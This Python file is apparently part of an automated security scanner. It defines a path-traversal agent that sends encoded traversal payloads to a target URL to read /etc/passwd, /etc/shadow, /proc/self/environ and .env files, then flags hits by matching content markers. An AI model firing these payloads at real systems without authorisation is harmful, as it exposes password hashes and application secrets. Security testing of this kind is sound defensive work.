"""Path Traversal Attack Agent 🗺️"""
from briar.agents.analyzer import SecurityAnalyzer
from briar.core.http import HTTPClient
from briar.core.params import TRAVERSAL as TRAVERSAL_PARAMS

class TraversalAgent:
    """Discovers path traversal / LFI with real payloads"""

    TRAVERSAL_PAYLOADS = [
        ("../../etc/passwd", "basic"),
        ("../../../etc/passwd", "basic"),
        ("....//....//....//etc/passwd", "double_dot"),
        ("..%2f..%2f..%2fetc%2fpasswd", "url_encoded"),
        ("..%252f..%252f..%252fetc%252fpasswd", "double_encoded"),
        ("/etc/passwd", "absolute"),
        ("../../etc/shadow", "shadow"),
        ("../../proc/self/environ", "proc"),
        ("../../var/log/apache2/access.log", "log_poison"),
        ("....//....//....//etc/shadow", "double_dot_shadow"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "full_encoded"),
    ]

    FILE_MARKERS = [
        ("root:", "/etc/passwd"),
        ("/bin/bash", "/etc/passwd"),
        ("/sbin/nologin", "/etc/passwd"),
        ("root:$", "/etc/shadow"),
        ("[extensions]", "php.ini"),
        ("DB_CONNECTION", ".env"),
        ("APP_KEY=", ".env"),
        ("DOCUMENT_ROOT", "proc/self/environ"),
        ("HTTP_HOST", "proc/self/environ"),
    ]

    def __init__(self, provider="ollama"):
        self.analyzer = SecurityAnalyzer(provider)
        self.http = HTTPClient(timeout=10)
        self.name = "PathTraversal"

    def scan(self, url: str, **kwargs) -> dict:
        """Scan for path traversal with real payloads"""
        findings = []
        traversal_params = TRAVERSAL_PARAMS

        for param in traversal_params:
            for payload, traversal_type in self.TRAVERSAL_PAYLOADS:
                try:
                    result = self.http.send_payload(url, param, payload)
                    if "error" in result:
                        continue

                    text = result.get("text_snippet", "")

                    for marker, file_type in self.FILE_MARKERS:
                        if marker in text:
                            findings.append({
                                "type": f"Path Traversal ({traversal_type})",
                                "severity": "Critical" if "shadow" in file_type or "env" in file_type else "High",
                                "param": param,
                                "payload": payload,
                                "file_read": file_type,
                                "marker": marker,
                                "traversal_type": traversal_type,
                            })
                            break

                    if findings:
                        break  # Found traversal on this param

                except:
                    pass

            if findings:
                break  # Found vulnerable param

        analysis = f"Path traversal scan complete for {url}\n\n"
        if findings:
            analysis += f"**{len(findings)} path traversal vulnerabilities found:**\n\n"
            for f in findings:
                analysis += f"- **{f['param']}**: {f['type']} — read `{f['file_read']}` via `{f['payload']}`\n"
            analysis += "\n---\n\nLLM analysis of real traversal findings:\n"
            llm_result = self.analyzer.analyze_endpoint(url, "GET", analysis)
            llm_result["real_findings"] = findings
        else:
            analysis += "No path traversal vulnerabilities detected with automated payloads.\n\nLLM analysis:\n"
            llm_result = self.analyzer.analyze_endpoint(url, "GET", analysis)
            llm_result["real_findings"] = findings

        llm_result["agent"] = self.name
        llm_result["type"] = "Path Traversal"
        llm_result["severity"] = "Critical" if any(f["severity"] == "Critical" for f in findings) else ("High" if findings else "Info")
        return llm_result
